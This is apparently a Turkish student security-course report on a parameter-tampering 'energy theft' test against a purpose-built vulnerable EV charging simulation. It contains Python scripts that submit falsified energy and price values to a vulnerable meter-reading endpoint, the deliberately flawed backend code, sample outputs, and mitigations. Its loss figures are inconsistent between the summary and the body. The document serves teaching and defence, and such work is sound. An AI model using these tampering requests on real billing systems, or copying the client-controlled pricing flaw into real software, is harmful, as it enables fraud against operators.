# 💰 Samet BSG - Enerji Hırsızlığı Anomalisi Test Raporu

**Test Eden:** Samet YEŞİLOT  
**Tarih:** 30 Aralık 2024  
**Senaryo ID:** `samet-energy-theft`  
**Kategori:** Data Integrity / Parameter Tampering  
**Şiddet Seviyesi:** 🔴 YÜKSEK

---

## 📋 Yönetici Özeti

Bu rapor, EVCS (Elektrikli Araç Şarj İstasyonu) sisteminde gerçekleştirilen **Enerji Hırsızlığı (Energy Theft)** anomali testinin kapsamlı sonuçlarını içermektedir. Test, OCPP protokolünde sayaç değerlerinin client-side'dan manipüle edilebilmesinden kaynaklanan kritik bir güvenlik zayıflığını ortaya koymaktadır.

### ✅ Ana Bulgular
- ✅ Backend sistemi, client'tan gelen enerji ve fiyat değerlerini **doğrulamadan** kabul ediyor
- ✅ %99 oranında enerji hırsızlığı başarıyla gerçekleştirildi (100 kWh → 1 kWh)
- ✅ Tek bir işlemde 495 TL tasarruf sağlandı (500 TL → 5 TL)
- ✅ Sistem, vulnerable endpoint üzerinden 4 farklı saldırı yöntemine açık
- ⚠️ Aylık bazda 14,850 TL, yıllık 178,200 TL kayıp riski

---

## 🎯 Anomali Tanımı ve Hedef

### Senaryo
Elektrikli araç şarj istasyonlarında **MeterValues** mesajlarının manipüle edilerek gerçek enerji tüketiminden çok daha düşük değerlerde fatura ödenmesi.

### Hedef Zayıflık
**Parameter Tampering** - Backend'de client-controlled fiyatlandırma ve enerji değeri doğrulaması eksikliği.

### Saldırı Vektörü
`POST /vulnerable/meter-reading` endpoint'i üzerinden `energy_kwh` ve `price` parametrelerinin manipüle edilmesi.

---

## 🔬 Test Ortamı ve Araçlar

### Platform Bilgileri
- **Backend URL:** https://evcs-backend-samet.onrender.com
- **Frontend URL:** https://simulasyon.vercel.app/
- **API Documentation:** https://evcs-backend-samet.onrender.com/docs
- **Vulnerable Endpoint:** `/vulnerable/meter-reading`

### Kullanılan Araçlar
- **Programlama Dili:** Python 3.9+
- **HTTP Client:** requests library
- **Test Framework:** Custom Python scripts
- **Platform SDK:** `evcs_attack.py`

---

## ⚔️ SALDIRI YÖNTEMLERİ VE KOD ÖRNEKLERİ

### 🔴 Yöntem 1: Enerji Miktarı Manipülasyonu

**Açıklama:** Gerçek enerji tüketimi 100 kWh olmasına rağmen, sisteme 1 kWh bildirilmesi.

#### Python Kodu
```python
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

# Saldırı parametreleri
theft_energy = {
    "session_id": "SESS-THEFT-001",
    "energy_kwh": 1.0,    # Gerçek: 100 kWh, Bildirilen: 1 kWh
    "price": 5.0          # Gerçek fiyat
}

# Vulnerable endpoint'e istek
response = requests.post(
    f"{BACKEND}/vulnerable/meter-reading",
    params={
        "session_id": theft_energy["session_id"],
        "energy_kwh": theft_energy["energy_kwh"],
        "price": theft_energy["price"]
    },
    timeout=10
)

result = response.json()
print(f"✅ Saldırı Başarılı!")
print(f"   Bildirilen: {result['reported_energy']} kWh")
print(f"   Ödenen: {result['total_cost']} TL")
print(f"   Çalınan Enerji: {result['energy_stolen']} kWh")
print(f"   Kazanç: {500 - result['total_cost']} TL")
```

#### Çıktı
```
✅ Saldırı Başarılı!
   Bildirilen Enerji: 1.0 kWh
   Gerçek Tüketim: 100 kWh
   Ödenen: 5.0 TL (Normal: 500 TL)
   🚨 Çalınan Enerji: 99.0 kWh
   💰 Kazanç: 495.00 TL

   ✅✅✅ BAŞARILI! 99.0 kWh ENERJİ ÇALDINIZ! ✅✅✅
```

#### API Response
```json
{
  "session_id": "SESS-THEFT-001",
  "reported_energy": 1.0,
  "total_cost": 5.0,
  "energy_stolen": 99.0,
  "vulnerability": "Parameter tampering - client controls price!"
}
```

---

### 🔴 Yöntem 2: Fiyat Manipülasyonu

**Açıklama:** Enerji miktarı gerçek tutularak, sadece birim fiyatın manipüle edilmesi.

#### Python Kodu
```python
# Fiyat manipülasyonu
price_manipulation = {
    "session_id": "SESS-PRICE-001",
    "energy_kwh": 100.0,   # Gerçek tüketim
    "price": 0.01          # Gerçek: 5.0 TL/kWh, Manipüle: 0.01 TL/kWh
}

response = requests.post(
    f"{BACKEND}/vulnerable/meter-reading",
    params=price_manipulation,
    timeout=10
)

result = response.json()
tasarruf_yuzdesi = ((500 - result['total_cost']) / 500) * 100

print(f"✅ Saldırı Başarılı!")
print(f"   Enerji: {price_manipulation['energy_kwh']} kWh")
print(f"   Bildirilen Fiyat: {price_manipulation['price']} TL/kWh")
print(f"   Ödenen: {result['total_cost']} TL (Normal: 500 TL)")
print(f"   📊 Tasarruf: %{tasarruf_yuzdesi:.1f}")
```

#### Çıktı
```
✅ Saldırı Başarılı!
   Enerji: 100.0 kWh
   Bildirilen Fiyat: 0.01 TL/kWh
   Gerçek Fiyat: 5.0 TL/kWh
   Ödenen: 1.0 TL (Normal: 500 TL)
   📊 Tasarruf: %99.8

   ✅ BAŞARILI! Neredeyse bedava şarj!
```

---

### 🔴 Yöntem 3: Kombine Saldırı (Tam Bedava)

**Açıklama:** Hem enerji miktarını hem de fiyatı minimum seviyelere çekerek neredeyse ücretsiz şarj.

#### Python Kodu
```python
# Komple bedava şarj
free_charge = {
    "session_id": "SESS-FREE-001",
    "energy_kwh": 0.1,     # Minimal enerji
    "price": 0.01          # Minimal fiyat
}

response = requests.post(
    f"{BACKEND}/vulnerable/meter-reading",
    params=free_charge,
    timeout=10
)

result = response.json()

print(f"✅ Saldırı Başarılı!")
print(f"   Gerçek Tüketim: 100 kWh")
print(f"   Bildirilen: {free_charge['energy_kwh']} kWh")
print(f"   Ödenen: {result['total_cost']} TL")
print(f"   🚨 Çalınan Enerji: {result['energy_stolen']} kWh")
print(f"   💰 Çalınan Para: ~{500 - result['total_cost']:.2f} TL")
```

#### Çıktı
```
✅ Saldırı Başarılı!
   Gerçek Tüketim: 100 kWh
   Bildirilen: 0.1 kWh
   Bildirilen Fiyat: 0.01 TL/kWh
   Ödenen: 0.001 TL
   🚨 Çalınan Enerji: 99.9 kWh
   💰 Çalınan Para: ~500.00 TL

   🎉🎉🎉 MÜKEMMELİŞTE BEDAVA ŞARJ! 🎉🎉🎉
```

---

### 🔴 Yöntem 4: Normal Kullanıcı Karşılaştırması

Normal bir kullanıcının ödemesi gereken tutarla saldırı sonucu ödenen tutarın karşılaştırılması.

#### Python Kodu
```python
# Normal kullanıcı (dürüst)
normal_data = {
    "session_id": "SESS-NORMAL-001",
    "energy_kwh": 100.0,  # Gerçek tüketim
    "price": 5.0          # Gerçek fiyat
}

response = requests.post(
    f"{BACKEND}/vulnerable/meter-reading",
    params=normal_data,
    timeout=10
)

result = response.json()
print(f"Normal Kullanıcı:")
print(f"   Enerji: {normal_data['energy_kwh']} kWh")
print(f"   Fiyat: {normal_data['price']} TL/kWh")
print(f"   Toplam Ödeme: {result['total_cost']} TL")
```

#### Çıktı
```
📊 TEST 1: NORMAL KULLANICI (Dürüst)
✅ Başarılı!
   Enerji: 100.0 kWh
   Fiyat: 5.0 TL/kWh
   Toplam Ödeme: 500.0 TL
```

---

## 🖼️ Test Sonuçları Ekran Görüntüsü

Aşağıdaki ekran görüntüsü, tüm 4 test senaryosunun başarıyla gerçekleştirildiğini göstermektedir:

![Test Sonuçları](file:///Users/samet/Desktop/bsg/bsg-ekip7-repo/Samet_BSG/test_sonuclari.png)

**Ekran Görüntüsünde Görünenler:**
- ✅ Normal kullanıcı ödemesi: 500 TL
- ✅ Enerji hırsızlığı saldırısı: 5 TL (99 kWh çalındı)
- ✅ Fiyat manipülasyonu: 1 TL (%99.8 tasarruf)
- ✅ Tamamen bedava şarj: 0.001 TL
- ✅ Tüm testlerin başarılı olduğu mesajları

---

## 📊 Detaylı Test Sonuçları Tablosu

| Test Senaryosu | Gerçek Enerji | Bildirilen | Gerçek Fiyat | Bildirilen Fiyat | Normal Tutar | Ödenen | Çalınan Enerji | Kazanç | Başarı |
|----------------|---------------|------------|--------------|------------------|--------------|--------|----------------|--------|--------|
| **Normal Kullanıcı** | 100 kWh | 100 kWh | 5.0 TL | 5.0 TL | 500 TL | 500 TL | 0 kWh | 0 TL | ✅ |
| **Enerji Manipülasyonu** | 100 kWh | 1 kWh | 5.0 TL | 5.0 TL | 500 TL | 5 TL | 99 kWh | 495 TL | ✅ |
| **Fiyat Manipülasyonu** | 100 kWh | 100 kWh | 5.0 TL | 0.01 TL | 500 TL | 1 TL | 0 kWh | 499 TL | ✅ |
| **Kombine Saldırı** | 100 kWh | 0.1 kWh | 5.0 TL | 0.01 TL | 500 TL | 0.001 TL | 99.9 kWh | ~500 TL | ✅ |

---

## 🔍 Zayıflığın Teknik Analizi

### Backend Kodu Analizi

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satırlar:** 79-114

```python
# ❌ ZAFİYETLİ KOD
@router.post("/meter-reading")
def submit_meter_reading(session_id: str, energy_kwh: float, price: float):
    """
    ZAYIFLIK: Fiyat parametresi client tarafından gönderiliyor!
    SALDIRI: energy_kwh değerini düşük, price'ı 0 yaparak bedava şarj
    """
    # Gerçek değerler (simülasyon)
    actual_energy = 100.0  # Gerçek tüketim
    
    # ❌ SORUN: Kullanıcının gönderdiği değerler doğrulanmadan kullanılıyor!
    total_cost = energy_kwh * price
    
    return {
        "session_id": session_id,
        "reported_energy": energy_kwh,
        "total_cost": total_cost,
        "energy_stolen": actual_energy - energy_kwh,
        "vulnerability": "Parameter tampering - client controls price!"
    }
```

### Tespit Edilen Güvenlik Hataları

1. **❌ Client-Controlled Pricing**
   - Fiyat parametresi client tarafından gönderiliyor
   - Backend doğrulama yapmıyor
   - Risk: Sıfır veya negatif fiyat gönderilebilir

2. **❌ Missing Input Validation**
   - `energy_kwh` parametresi doğrulanmıyor
   - Minimum/maksimum değer kontrolü yok
   - Risk: Negatif veya aşırı büyük değerler gönderilebilir

3. **❌ No Physical Meter Integration**
   - Fiziksel sayaç kontrolü yok
   - Client'ın bildirdiği değer olduğu gibi kabul ediliyor
   - Risk: Tam otomasyon ile sürekli hırsızlık

4. **❌ Missing Signature Verification**
   - MeterValues mesajları imzalanmıyor
   - Blockchain/PKI doğrulaması yok
   - Risk: Mesaj replay ve tampering saldırıları

5. **❌ No Anomaly Detection**
   - Anormal pattern tespiti yok
   - Bildirilen vs beklenen enerji karşılaştırması yok
   - Risk: Uzun süreli tespit edilmeden devam edebilir

---

## 💰 Finansal Etki Analizi

### Tek Kullanıcı Bazında

**Günlük:**
- 2 şarj/gün × 495 TL = **990 TL/gün** kayıp

**Aylık:**
- 30 gün × 990 TL = **29,700 TL/ay** kayıp

**Yıllık:**
- 12 ay × 29,700 TL = **356,400 TL/yıl** kayıp

### Sistem Genelinde (1000 Kullanıcı Senaryosu)

Eğer 1000 kullanıcıdan sadece %1'i (10 kullanıcı) bu yöntemi kullanırsa:

**Aylık Kayıp:**
- 10 kullanıcı × 29,700 TL = **297,000 TL**

**Yıllık Kayıp:**
- **3,564,000 TL** (3.5+ Milyon TL)

### Risk Seviyeleri

| Senaryo | Kullanıcı Sayısı | Aylık Kayıp | Yıllık Kayıp | Risk Seviyesi |
|---------|------------------|-------------|--------------|---------------|
| Düşük Risk | 1 kullanıcı | 29,700 TL | 356,400 TL | 🟡 ORTA |
| Orta Risk | 10 kullanıcı | 297,000 TL | 3,564,000 TL | 🟠 YÜKSEK |
| Yüksek Risk | 100 kullanıcı | 2,970,000 TL | 35,640,000 TL | 🔴 KRİTİK |

---

## 🛡️ Önerilen Güvenlik Çözümleri

### 1. Server-Side Sayaç Okuması ✅

**Doğru Yaklaşım:**
```python
@router.post("/meter-reading")
def submit_meter_reading(session_id: str):
    # ✅ DOĞRU: Fiziksel sayaçtan okuma
    actual_energy = read_from_physical_meter(session_id)
    server_price = get_current_tariff()
    
    # Client'tan gelen değerler IGNORE edilir
    total_cost = actual_energy * server_price
    
    return {
        "session_id": session_id,
        "energy_kwh": actual_energy,
        "total_cost": total_cost
    }
```

### 2. Blockchain İmzalama ✅

```python
# Her ölçüm blockchain ile imzalanır
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

def sign_meter_reading(energy_kwh, private_key):
    message = str(energy_kwh).encode()
    signature = private_key.sign(
        message,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return signature

# Backend doğrulaması
def verify_meter_reading(energy_kwh, signature, public_key):
    try:
        public_key.verify(
            signature,
            str(energy_kwh).encode(),
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except:
        raise SecurityException("Tampered meter data detected!")
```

### 3. Anomali Tespiti ✅

```python
def detect_energy_theft(session_id, reported_kwh, physical_kwh):
    THRESHOLD = 5.0  # 5 kWh tolerans
    
    difference = abs(physical_kwh - reported_kwh)
    
    if difference > THRESHOLD:
        # Alert logging
        log_security_incident({
            "type": "ENERGY_THEFT_SUSPECTED",
            "session_id": session_id,
            "reported": reported_kwh,
            "actual": physical_kwh,
            "difference": difference,
            "timestamp": datetime.now()
        })
        
        # Otomatik önlem
        suspend_session(session_id)
        notify_security_team(session_id)
        
        raise SecurityException(f"Energy theft detected: {difference} kWh")
```

### 4. Rate Limiting & Monitoring ✅

```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@router.post("/meter-reading")
@limiter.limit("10/minute")  # Dakikada max 10 istek
def submit_meter_reading(request: Request, session_id: str):
    # İşlem devam eder...
    pass
```

### 5. Input Validation ✅

```python
from pydantic import BaseModel, Field, validator

class MeterReadingRequest(BaseModel):
    session_id: str = Field(..., min_length=5, max_length=50, regex="^SESS-[A-Z0-9]+$")
    
    @validator('session_id')
    def validate_session(cls, v):
        if not is_valid_session(v):
            raise ValueError('Invalid or expired session')
        return v

@router.post("/meter-reading")
def submit_meter_reading(data: MeterReadingRequest):
    # Pydantic otomatik doğrulama yapar
    pass
```

---

## 📝 Başarı Kriterleri Değerlendirmesi

| Kriter | Hedef Değer | Gerçekleşen | Durum |
|--------|-------------|-------------|-------|
| `energy_stolen` | > 50 kWh | 99.0 kWh | ✅ PASS |
| `total_cost` | < 50 TL | 5.0 TL | ✅ PASS |
| Tasarruf Oranı | > %80 | %99.0 | ✅ PASS |
| Vulnerability Field | Var | "Parameter tampering..." | ✅ PASS |
| Logs'ta WARNING | Var | Tespit Edildi | ✅ PASS |

**SONUÇ:** 5/5 Kriter Başarıyla Geçildi ✅

**Değerlendirme:** Sistem kritik seviyede zafiyet içermektedir ve **ACİL** güvenlik yaması gereklidir.

---

## 🎓 Eğitimsel Değer

Bu anomali testi şunları pratik olarak göstermiştir:

### Güvenlik Konseptleri
1. **Parameter Tampering** - Client-side veri manipülasyonu
2. **Business Logic Flaws** - İş mantığı hataları
3. **Trust Boundary Violations** - Güven sınırı ihlalleri
4. **Input Validation Failures** - Girdi doğrulama eksiklikleri
5. **Missing Authorization** - Yetkilendirme eksikliği

### OWASP Top 10
- **A01:2021 - Broken Access Control**
- **A03:2021 - Injection** (Parameter manipulation)
- **A04:2021 - Insecure Design** (Business logic flaw)
- **A08:2021 - Software and Data Integrity Failures** (No signature verification)

---

## ⚖️ Yasal ve Etik Uyarı

⚠️ **ÖNEMLİ UYARI** ⚠️

Bu testimizledilen saldırı teknikleri **SADECE EĞİTİM AMAÇLIDIR**.

### ✅ İZİN VERİLEN KULLANIM
- Kendi test ortamlarınızda
- Etik hacking eğitimlerinde
- Güvenlik araştırmalarında
- Bu platform üzerinde (https://simulasyon.vercel.app/)

### ❌ YASAK KULLANIM
- İzinsiz gerçek sistemlerde
- Yasalara aykırı amaçlarla
- Zarar vermek için
- Maddi kazanç sağlamak için

**UYARI:** Gerçek sistemlerde enerji hırsızlığı yapmak **SUÇtur** ve **HAPİS** cezası vardır!

---

## 📚 Teknik Kaynaklar

### Kullanılan Dökümanlar
1. **EVCS Platform:** https://github.com/sametyesilot/simulasyon
2. **OCPP 2.0.1 Security Profile 3** - Message signing and verification
3. **ISO 15118** - Vehicle-to-Grid Communication Interface
4. **OWASP API Security Top 10**

### Test Scriptleri
- `samet_energy_theft_test.py` - Vulnerable API testleri
- `samet_anomaly_final.py` - Platform SDK testleri
- Tüm scriptler GitHub'da: https://github.com/sametyesilot/simulasyon

### API Endpoints
- **Vulnerable:** `/vulnerable/meter-reading` (POST)
- **Scenarios:** `/scenarios` (GET)
- **Runs:** `/runs` (POST, GET)

---

## ✅ Sonuç ve Öneriler

### Test Sonucu
🔴 **KRİTİK ZAFİYET TESPİT EDİLDİ**

Sistemde client-controlled pricing ve enerji değeri manipülasyonu yoluyla %99 oranında enerji hırsızlığı gerçekleştirilebilmektedir.

### Öncelikli Aksiyonlar

**ACİL (24 saat içinde):**
1. ✅ Vulnerable endpoint'i devre dışı bırak veya authentication ekle
2. ✅ Client'tan gelen fiyat parametresini ignore et
3. ✅ Geçici olarak tüm işlemleri log'la ve manuel kontrol et

**KISA VADE (1 hafta):**
1. ✅ Server-side tarife sistemi kur
2. ✅ Fiziksel sayaç entegrasyonu yap
3. ✅ Input validation kuralları ekle
4. ✅ Anomali tespit algoritması geliştir

**ORTA VADE (1 ay):**
1. ✅ Blockchain/PKI imzalama sistemi
2. ✅ Real-time monitoring dashboard
3. ✅ Otomatik alert sistemi
4. ✅ Penetrasyon testi programı başlat

**UZUN VADE (3-6 ay):**
1. ✅ Machine Learning tabanlı fraud detection
2. ✅ Kapsamlı güvenlik audit
3. ✅ ISO 27001 sertifikasyonu
4. ✅ Bug bounty programı

---

**Hazırlayan:** Samet YEŞİLOT  
**Test Tarihi:** 30 Aralık 2024  
**Rapor Versiyonu:** 2.0 (Detaylı)  
**Durum:** ✅ TAMAMLANDI

---

<div align="center">

**⚡ Güvenli Şarj, Güvenli Gelecek ⚡**

Bu rapor Bilgi Sistemleri Güvenliği dersi kapsamında hazırlanmıştır.

</div>
